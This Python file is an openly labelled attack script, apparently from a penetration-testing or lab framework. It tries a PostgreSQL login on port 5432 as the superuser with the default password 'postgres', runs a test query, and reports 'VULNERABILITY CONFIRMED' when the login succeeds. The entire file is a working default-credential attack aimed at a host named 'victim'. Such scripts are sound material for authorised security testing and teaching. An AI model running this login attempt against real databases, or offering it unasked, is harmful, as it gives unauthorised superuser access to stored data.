"""
ATTACK NAME: PostgreSQL Default Credentials
PORT: 5432
VULNERABILITY: The database administrator failed to change the default 
installation credentials. The 'postgres' superuser account is accessible 
using the password 'postgres'.

HOW IT WORKS:
1. We use the standard PostgreSQL client library (psycopg2).
2. We attempt to authenticate to the 'template1' default database.
3. If successful, we execute a test query: 'SELECT current_user;'
4. If the server replies with 'postgres', we have full DB compromise.

SECURITY IMPACT: High. Total data compromise, potential for privilege escalation.
"""

import psycopg2

def validate_evidence(validation_rule, result):
    if result is None: return False
    try:
        if validation_rule.get("type") == "exact_match":
            return str(result).strip() == str(validation_rule.get("expected")).strip()
    except Exception as e:
        print(f"[!] Validation Error: {e}")
    return False

TARGET_IP = "victim"

# The "Template" Data
TEMPLATE = {
    "params": {
        "port": 5432,
        "user": "postgres",
        "password": "postgres",
        "database": "template1",
        "query": "SELECT current_user;",
        "timeout": 5
    },
    "validation": {
        "type": "exact_match",
        "expected": "postgres"
    }
}

def run_test():
    print(f"[*] Attacking {TARGET_IP} on Port 5432 (PostgreSQL)...")
    raw_query_result = None
    
    # --- STEP 1: FIRE THE LOGIN ATTEMPT ---
    try:
        print(f"[*] Attempting login with {TEMPLATE['params']['user']}:{TEMPLATE['params']['password']}...")
        
        # We leverage psycopg2 which is already in your container
        conn = psycopg2.connect(
            host=TARGET_IP,
            port=TEMPLATE["params"]["port"],
            user=TEMPLATE["params"]["user"],
            password=TEMPLATE["params"]["password"],
            dbname=TEMPLATE["params"]["database"],
            connect_timeout=TEMPLATE["params"]["timeout"]
        )
        
        print("[+] Login successful! Executing payload query...")
        cur = conn.cursor()
        cur.execute(TEMPLATE["params"]["query"])
        raw_query_result = cur.fetchone()[0] # Grab the first result
        
        print(f"[+] Query Result: {raw_query_result}")
        
        cur.close()
        conn.close()
        
    except psycopg2.OperationalError as e:
        print(f"[!] Authentication Failed or Host Unreachable: {e}")
        return
    except Exception as e:
        print(f"[!] Execution Failed: {e}")
        return

    # --- STEP 2: VALIDATE ---
    print("[*] Running Validator...")
    is_success = validate_evidence(TEMPLATE["validation"], raw_query_result)
    
    if is_success:
        print("✅ VERDICT: VULNERABILITY CONFIRMED. Default DB credentials active.")
    else:
        print("❌ VERDICT: EXPLOIT FAILED.")

if __name__ == "__main__":
    run_test()